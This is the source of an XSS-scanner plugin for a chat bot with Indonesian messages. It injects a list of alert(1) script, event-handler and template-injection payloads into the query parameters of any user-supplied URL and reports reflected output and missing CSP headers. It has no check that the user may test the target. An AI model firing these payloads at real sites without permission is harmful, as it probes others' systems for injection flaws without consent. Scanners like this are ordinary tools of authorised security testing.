/**
 * XSS Vulnerability Checker - KYOKO MD Pentest Feature
 * Check for Cross-Site Scripting vulnerabilities
 * Developer: ZetaGo-Aurum
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

const pluginConfig = {
    name: 'xss',
    alias: ['xsscheck', 'xssscan'],
    category: 'pentest',
    description: 'Cek kerentanan XSS pada URL',
    usage: '.xss <url_dengan_parameter>',
    example: '.xss https://example.com/search?q=test',
    isOwner: false,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 30,
    limit: 1,
    isEnabled: true
};

// XSS test payloads
const XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}'
];

// Unique marker for detection
const UNIQUE_MARKER = 'KYOKO_XSS_TEST_' + Date.now();

function makeRequest(url, timeout = 8000) {
    return new Promise((resolve) => {
        try {
            const parsedUrl = new URL(url);
            const protocol = parsedUrl.protocol === 'https:' ? https : http;
            
            const req = protocol.get(url, {
                timeout,
                rejectUnauthorized: false,
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0' }
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
            });
            
            req.on('error', () => resolve({ status: 0, error: true }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ status: 0, timeout: true });
            });
        } catch (e) {
            resolve({ status: 0, error: true });
        }
    });
}

async function handler(m, { sock }) {
    const target = m.text?.trim();
    
    if (!target) {
        return m.reply(
            `üîì *xss ·¥†·¥ú ü…¥·¥á Ä·¥Ä ô…™ ü…™·¥õ è ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á Ä*\n\n` +
            `> Cek kerentanan Cross-Site Scripting\n\n` +
            `*Penggunaan:*\n` +
            `> ${m.prefix}xss <url_dengan_parameter>\n\n` +
            `*Contoh:*\n` +
            `> ${m.prefix}xss https://site.com/search?q=test`
        );
    }
    
    let testUrl;
    try {
        testUrl = new URL(target);
        if (!testUrl.search || testUrl.search === '?') {
            return m.reply(`‚ùå URL harus memiliki parameter!\n\nContoh: \`https://site.com/search?q=test\``);
        }
    } catch {
        return m.reply(`‚ùå URL tidak valid!`);
    }
    
    await m.reply(`üîì *xss ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á Ä*\n\n‚è≥ Testing ${target}...\n> Mohon tunggu...`);
    
    try {
        const findings = [];
        const startTime = Date.now();
        const params = testUrl.searchParams;
        
        // Test each parameter
        for (const [key, value] of params) {
            // First test: Check if input is reflected
            const markerParams = new URLSearchParams(params);
            markerParams.set(key, UNIQUE_MARKER);
            const markerUrl = `${testUrl.origin}${testUrl.pathname}?${markerParams.toString()}`;
            const markerResult = await makeRequest(markerUrl);
            
            if (!markerResult.body || !markerResult.body.includes(UNIQUE_MARKER)) {
                continue; // Parameter not reflected, skip
            }
            
            // Test XSS payloads
            for (const payload of XSS_PAYLOADS) {
                const testParams = new URLSearchParams(params);
                testParams.set(key, payload);
                
                const testUrlStr = `${testUrl.origin}${testUrl.pathname}?${testParams.toString()}`;
                const result = await makeRequest(testUrlStr, 5000);
                
                if (result.body) {
                    // Check if payload appears unencoded
                    if (result.body.includes(payload)) {
                        findings.push({
                            param: key,
                            payload: payload.substring(0, 30),
                            type: 'REFLECTED',
                            confidence: 'High'
                        });
                        break;
                    }
                    
                    // Check for partial reflection (some chars not encoded)
                    if (result.body.includes('<script') || 
                        result.body.includes('onerror=') ||
                        result.body.includes('onload=')) {
                        const alreadyFound = findings.some(f => f.param === key);
                        if (!alreadyFound) {
                            findings.push({
                                param: key,
                                payload: payload.substring(0, 30),
                                type: 'PARTIAL',
                                confidence: 'Medium'
                            });
                        }
                    }
                }
            }
        }
        
        // Check for CSP header
        const mainPage = await makeRequest(target);
        const hasCSP = mainPage.headers && mainPage.headers['content-security-policy'];
        
        const scanTime = ((Date.now() - startTime) / 1000).toFixed(2);
        
        let txt = `üîì *xss s·¥Ñ·¥Ä…¥  Ä·¥ás·¥ú ü·¥õ*\n\n`;
        txt += `üéØ Target: \`${testUrl.origin}${testUrl.pathname}\`\n`;
        txt += `üìä Params tested: ${[...params.keys()].length}\n`;
        txt += `üõ°Ô∏è CSP: ${hasCSP ? '‚úÖ Present' : '‚ùå Missing'}\n`;
        txt += `‚è±Ô∏è Time: ${scanTime}s\n\n`;
        
        if (findings.length > 0) {
            txt += `‚ö†Ô∏è *·¥ò·¥è·¥õ·¥á…¥·¥õ…™·¥Ä ü xss* (${findings.length})\n`;
            txt += `‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ\n`;
            for (const f of findings) {
                txt += `  ‚ó¶ Param: \`${f.param}\`\n`;
                txt += `    Type: ${f.type}\n`;
                txt += `    Confidence: ${f.confidence}\n\n`;
            }
        } else {
            txt += `‚úÖ Tidak terdeteksi kerentanan XSS.\n`;
            txt += `> Parameter di-encode dengan benar.\n`;
        }
        
        txt += `\n> ‚ö†Ô∏è _Scan dasar. DOM-based XSS tidak terdeteksi._`;
        
        await m.reply(txt);
        
    } catch (error) {
        await m.reply(`‚ùå Scan gagal: ${error.message}`);
    }
}

module.exports = { config: pluginConfig, handler };
